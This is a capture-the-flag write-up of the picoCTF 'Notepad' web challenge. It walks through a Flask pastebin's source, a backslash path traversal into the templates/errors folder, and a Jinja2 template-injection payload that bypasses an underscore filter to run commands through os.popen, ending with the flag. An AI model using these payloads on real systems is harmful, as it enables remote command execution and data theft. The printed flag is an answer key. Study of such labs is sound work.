---
title: "Notepad"
tags:
- CTF
- Jinja2
- Path Traversal
- PicoCTF
- Python
- Web
date: 2022-02-21T09:24:30+05:30
draft: false
---

At first glance the webapp looks like a stripped down version of Pastebin where we can post a text / code snippet.
After submitting the query, we are redirected to an html page containing the content of the post.

The first thing I tried was triggering XSS (cross site scripting) with the following:
```html
<script>alert(1)</script>
```

The application source directory tree looks like the following:
```
.
├── app.py
├── Dockerfile
├── flag.txt
├── static
└── templates
    ├── errors
    │   ├── bad_content.html
    │   └── long_content.html
    └── index.html

```

Let's inspect the `app.py` source.

```python
from werkzeug.urls import url_fix
from secrets import token_urlsafe
from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html", error=request.args.get("error"))

@app.route("/new", methods=["POST"])
def create():
    content = request.form.get("content", "")
    if "_" in content or "/" in content:
        return redirect(url_for("index", error="bad_content"))
    if len(content) > 512:
        return redirect(url_for("index", error="long_content", len=len(content)))
    name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
    with open(name, "w") as f:
        f.write(content)
    return redirect(name)
```

Ok, so the application returns the `bad_content` message when it sees a slash or an underscore.
However, we can notice that an attacker has partial control over the error message template.

```python
@app.route("/")
def index():
    return render_template("index.html", error=request.args.get("error"))
```

The content we post gets uploaded to the static directory and the filename consists of the first 128 characters of the content, a hyphen and an 8 character url-safe random token.

```python
name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
```

So, we can upload a valid Jinja2 template to errors directory, then use the filename in the error parameter tp render it through Jinja.

We can use a backslash instead of a forward slash along with double periods (`..`) for path traversal. From the static directory we'll go:
path | explanation
---- | ----
`..` | up to the root of the app
`..\templates\` | into templates
`..\templates\errors\` | then into errors 

We'll fill the remainder of the first 128 characters of the content to `A`s so that the filename does not get messed up.
Next up, using the right payload. I picked the following up from PayloadAllTheThings

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

We have to bypass the underscores and it would be better if we could control the command.
The command can be passed through a request parameter and so can the underscore be.
We'll pass the underscore to the parameter `u` and retrieve it in the template using `request.args.u`.
Similarly, we'd retrieve the command `c` using `request.args.c`.

So
```python
cycler.__init__.__globals__
```
becomes
```python
cycler[request.args.u*2+'init'+request.args.u*2][request.args.u*2+'globals'+request.args.u*2]
```

Putting it all together, we have:

```python
..\templates\errors\AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
{{cycler[request.args.u*2+'init'+request.args.u*2][request.args.u*2+'globals'+request.args.u*2].os.popen(request.args.c).read()}}
```

Note the `request.args.c` passed to `os.popen` for the commands we would run.

After uploading the payload we are rediected to a not found page.

https://notepad.mars.picoctf.net/templates/errors/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-xcdn7y8bhU0.html

Let's now cause the app render our custom _"error"_ page. We'll also set the get parameter `u` to `_` and `c` to the command to run.

https://notepad.mars.picoctf.net/?errors=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-xcdn7y8bhU0&u=_&c=COMMAND

Setting `c` to the `ls` command, we get:

```none
app.py
flag-c8f5526c-4122-4578-96de-d7dd27193798.txt
static
templates
```

Let's view the flag file. We'll set `c` to `cat%20flag-c8f5526c-4122-4578-96de-d7dd27193798.txt`

There's our flag!

```
picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}
```
